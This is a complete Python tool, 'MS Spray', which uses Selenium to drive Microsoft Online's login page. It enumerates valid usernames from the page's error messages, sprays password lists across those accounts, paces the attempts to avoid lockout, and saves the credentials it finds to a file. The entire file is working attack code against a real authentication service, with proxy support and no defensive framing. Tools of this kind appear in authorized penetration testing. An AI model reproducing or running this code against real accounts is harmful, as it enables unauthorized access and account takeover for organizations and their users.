#!/usr/bin/env python3


"""A basic username enumeration and password spraying tool aimed at spraying MS Online's DOM based authentication."""

from sys import exit
from time import sleep
from argparse import ArgumentParser
from collections import OrderedDict

# Import selenium packages
from selenium.webdriver import Firefox, FirefoxProfile, DesiredCapabilities
from selenium.common.exceptions import TimeoutException, WebDriverException
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.common.proxy import Proxy, ProxyType
from selenium.webdriver.firefox.options import Options

# Handle deprecation warnings for the time being
import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning) 


# Mapping of element ID's in the authentication process
elements = {
    "type":      "XPATH",
    "username":  "//*[@id=\"i0116\"]",
    "password":  "//*[@id=\"i0118\"]",
    "button":    "//*[@id=\"idSIButton9\"]",
    "usererror": "//*[@id=\"usernameError\"]",
    "passerror": "//*[@id=\"passwordError\"]",
    "locked":    "//*[@id=\"idTD_Error\"]",
    "work":      "//*[@id=\"aadTile\"]"
}


# Colorized output during run
class text_colors:
    red = "\033[91m"
    green = "\033[92m"
    yellow = "\033[93m"
    reset = "\033[0m"


class BrowserEngine:

    options = Options()
    profile = FirefoxProfile()  # Set preferences at the class level
    profile.set_preference("permissions.default.image", 2)  # Supposed to help with memory issues
    profile.set_preference("dom.ipc.plugins.enabled.libflashplayer.so", False)
    profile.set_preference("browser.cache.disk.enable", False)
    profile.set_preference("browser.cache.memory.enable", False)
    profile.set_preference("browser.cache.offline.enable", False)
    profile.set_preference("network.http.use-cache", False)
    profile.accept_untrusted_certs = True

    def __init__(self, wait=5, proxy=None, headless=True):
        self.proxy = None if not proxy else self.proxy(proxy)
        self.options.headless = headless
        self.driver = Firefox(options=self.options, firefox_profile=self.profile, desired_capabilities=self.proxy)
        self.driver.set_window_position(0, 0)  # TODO: Not sure if these help or not with optimization
        self.driver.set_window_size(1024, 768)
        self.wait = WebDriverWait(self.driver, wait)

    def proxy(self, proxy):
        proxy = Proxy({
            "proxyType": ProxyType.MANUAL,
            "httpProxy": proxy, 
            "ftpProxy":  proxy,
            "sslProxy":  proxy,
            "noProxy":   ""
        })
        capabilities = DesiredCapabilities.FIREFOX
        proxy.add_to_capabilities(capabilities)
        return capabilities

    def quit(self):
        self.driver.quit()

    def close(self):
        self.driver.close()

    def refresh(self):
        self.driver.refresh()

    def back(self):
        self.driver.execute_script("window.history.go(-1)")

    def clear_cookies(self):
        self.driver.delete_all_cookies()

    def get(self, url):
        self.driver.get(url)

    def find_element(self, type_, value):
        try:
            return self.wait.until(
                lambda driver: driver.find_element(getattr(By, type_), value)
            )
        except TimeoutException:
            return False

    def populate_element(self, element, value):
        element.send_keys(value)

    def is_clickable(self, type_, value):
        return self.wait.until(
            EC.element_to_be_clickable((getattr(By, type_), value))
        )

    def click(self, button):
        button.click()

    def select_dropdown(self, element, value):
        select = Select(element)
        select.select_by_value(value)

    def submit(self, form):
        form.submit()

    def execute_script(self, code):
        self.driver.execute_script(code)

    def screenshot(self, filename):
        self.driver.get_screenshot_as_file(filename)



# ==========
# Statistics
# ==========
def spray_stats(creds, locked, invalid):
    print("\n%s\n[*] Password Spraying Stats\n%s" % ("="*27, "="*27))   
    print("[*] Total Usernames Tested:  %d" % (len(creds) + len(locked) + invalid))
    print("[*] Valid Accounts:          %d" % len(creds))
    print("[*] Locked Accounts:         %d" % len(locked))
    print("[*] Invalid Usernames:       %d" % invalid)
    if len(creds) > 0:
        print("[+] Writing valid credentials to the file: valid_creds.txt...")
        with open("valid_creds.txt", 'w') as file_:
            for user in creds.keys():
                file_.write("%s\n" % ("%s:%s" % (user, creds[user])))

def enum_stats(valid, invalid):
    print("\n%s\n[*] Username Enumeration Stats\n%s" % ("="*30, "="*30))
    print("[*] Total Usernames Tested:  %d" % (len(valid) + invalid))
    print("[*] Valid Usernames:         %d" % len(valid))
    print("[*] Invalid Usernames:       %d" % invalid)
    if len(valid) > 0:
        print("[+] Writing valid usernames to the file: valid_users.txt...")
        with open("valid_users.txt", 'w') as file_:
            for user in valid:
                file_.write("%s\n" % user)


# =========================
# Data manipulation helpers
# =========================
def loop_dict(dict_):
    for key in dict_.keys():
        yield key

def get_chunks_from_list(list_, n):
    for i in range(0, len(list_), n):
        yield list_[i:i + n]

def get_list_from_file(file_):
    with open(file_, "r") as f:
        list_ = [line.strip() for line in f]
    return list_

def check_last_chunk(sublist, full_list):
    """ Identify if the current list chunk is the last chunk """
    if sublist[-1] == full_list[-1]:
        return True
    return False


# =========================
# Password spraying helpers
# =========================
def lockout_reset_wait(lockout):
    print("[*] Sleeping for %.1f minutes" % (lockout))
    sleep(lockout * 60)

def reset_browser(browser, wait, proxy):
    browser.close()
    return BrowserEngine(wait=wait, proxy=proxy)



# Password spray
def spray(args, username_list, password_list):
    creds = {}
    locked = []
    invalid = 0
    browser = BrowserEngine(wait=args.wait, proxy=args.proxy)

    for sublist in get_chunks_from_list(password_list, args.count):

        print("[*] Spraying passwords: [%s]" % (", ".join("'%s'" % pass_ for pass_ in sublist)))

        for username in username_list:

            print("[*] Current username: %s" % username)

            # This seems to helps with memory issues...
            browser.clear_cookies()

            # Reload the page for each username
            retry = 0
            loaded = None
            while loaded is None:
                try:
                    browser.get(args.target)
                    loaded = True
                except WebDriverException as e:
                    retry += 1
                    if retry == 5:
                        print("[ERROR] %s" % e)
                        exit(1)
                    pass

            # Populate the username field and click 'Next'
            browser.populate_element(browser.find_element(elements["type"], elements["username"]), username)
            browser.click(browser.is_clickable(elements["type"], elements["button"]))

            sleep(1) # Ensure the previous DOM is stale

            # Handle invalid usernames
            if browser.find_element(elements["type"], elements["usererror"]):
                if args.verbose: print("%s[Invalid User] %s%s" % (text_colors.red, username, text_colors.reset))
                invalid += 1 # Keep track so the user knows they need to run enum
                continue

            # Check if Microsoft prompts for work/personal account
            if browser.find_element(elements["type"], elements["work"]):
                browser.execute_script("document.getElementById(\"aadTile\").click()") # Select Work
                sleep(1) # Ensure the previous DOM is stale


            for password in sublist:

                # Populate the password field and click 'Sign In'
                browser.populate_element(browser.find_element(elements["type"], elements["password"]), password)
                browser.click(browser.is_clickable(elements["type"], elements["button"]))

                sleep(1) # Ensure the previous DOM is stale

                # Check if account is locked out
                if browser.find_element(elements["type"], elements["locked"]):
                    if args.verbose: print("%s[Account Locked] %s%s" % (text_colors.yellow, username, text_colors.reset))
                    locked.append(username)
                    break

                # Check for invalid password or account lock outs
                if not browser.find_element(elements["type"], elements["passerror"]):
                    print("%s[Found] %s:%s%s" % (text_colors.green, username, password, text_colors.reset))
                    creds[username] = password

                else:
                    print("%s[Invalid Creds] %s:%s%s" % (text_colors.red, username, password, text_colors.reset))
                    invalid += 1 # Keep track so the user knows they need to run enum


        # Check if we are done - this is to avoid the lockout wait period
        # from triggering on the last iteration
        if check_last_chunk(sublist, password_list):
            break

        else:
            browser = reset_browser(browser, args.wait, args.proxy) # Reset the browser to deal with latency issues
            lockout_reset_wait(args.lockout) # Wait for lockout period

    spray_stats(creds, locked, invalid)



# Username enumeration
def enum(args, username_list):
    valid = []
    invalid = 0
    counter = 0
    browser = BrowserEngine(wait=args.wait, proxy=args.proxy)

    for username in username_list:

        counter += 1

        print("[*] Current username: %s" % username)

        # This seems to helps with memory issues...
        browser.clear_cookies()

        # Reload the page for each username
        retry = 0
        loaded = None
        while loaded is None:
            try:
                browser.get(args.target)
                loaded = True
            except WebDriverException as e:
                retry += 1
                if retry == 5:
                    print("[ERROR] %s" % e)
                    exit(1)
                pass

        # Populate the username field and click 'Next'
        browser.populate_element(browser.find_element(elements["type"], elements["username"]), username)
        browser.click(browser.is_clickable(elements["type"], elements["button"]))

        sleep(1) # Ensure the previous DOM is stale

        # Handle invalid usernames
        if browser.find_element(elements["type"], elements["usererror"]):
            if args.verbose: print("%s[Invalid User] %s%s" % (text_colors.red, username, text_colors.reset))
            browser.find_element(elements["type"], elements["username"]).clear() # Clear the element for next username
            invalid += 1
            continue

        # If no username error, valid username
        else:
            print("%s[Found] %s%s" % (text_colors.green, username, text_colors.reset))
            valid.append(username)


        # Handle browser resets after every 10 username attempts
        if counter == 5:
            browser = reset_browser(browser, args.wait, args.proxy) # Reset the browser to deal with latency issues
            counter = 0

    enum_stats(valid, invalid)



# Print the banner
def banner(args):
    BANNER  = "\n             *** MS Spray ***            \n"
    BANNER += "\n>----------------------------------------<\n"

    _args = vars(args)
    for arg in _args:
        if _args[arg]:
            space = ' ' * (15 - len(arg))

            BANNER += "\n   > %s%s:  %s" % (arg, space, str(_args[arg]))

            # Add data meanings
            if arg == 'count':
                BANNER += " passwords/spray"

            if arg == 'lockout':
                BANNER += " minutes"
            
            if arg == 'wait':
                BANNER += " seconds"

    BANNER += "\n"
    BANNER += "\n>----------------------------------------<\n"

    print(BANNER)



"""
MS Online handles authentication uniquely.
Instead of username and password fields in a single form on one page, the DOM dynamically modifies
the page to accept a username, check if it is valid, and then accept a password.
"""
if __name__ == "__main__":
    parser = ArgumentParser(description="MS Online Password Sprayer.")
    parser.add_argument("-t", "--target",   type=str, help="Target URL", default="https://login.microsoftonline.com/")
    parser.add_argument("-u", "--username", type=str, help="File containing usernames", required=True)
    parser.add_argument("-p", "--password", type=str, help="File containing passwords", required=False)
    parser.add_argument("--proxy",   type=str, help="Proxy to pass traffic through: <ip:port>", required=False)
    parser.add_argument("--wait",    type=int, help="Time to wait when looking for DOM elements (in seconds). Default: 3", default=3, required=False)
    parser.add_argument("--count",   type=int, help="Number of password attempts per user before lockout", required=False)
    parser.add_argument("--lockout", type=float, help="Lockout policy reset time (in minutes)", required=False)
    parser.add_argument("--verbose", action="store_true", help="Verbose output", required=False)

    group = parser.add_mutually_exclusive_group(required=True)

    group.add_argument("-e", "--enum",  action="store_true", help="Perform username enumeration")
    group.add_argument("-s", "--spray", action="store_true", help="Perform password spraying")

    args = parser.parse_args()

    # If password spraying make sure we have all the information
    if args.spray and (not args.password or not args.count or not args.lockout):
        parser.print_help()
        print("\n[ERROR] When performing password spraying [--spray] you must specify the" +
            " the following: password file [--password], password count [--count]" +
            " and lockout timer in minutes [--lockout].")
        exit(1)

    # Print the banner
    banner(args)

    try:
        username_list = get_list_from_file(args.username)

        if args.spray:
            password_list = get_list_from_file(args.password)
            spray(args, username_list, password_list)

        elif args.enum:
            enum(args, username_list)

    except IOError as e:
        print(e)
        exit(1)
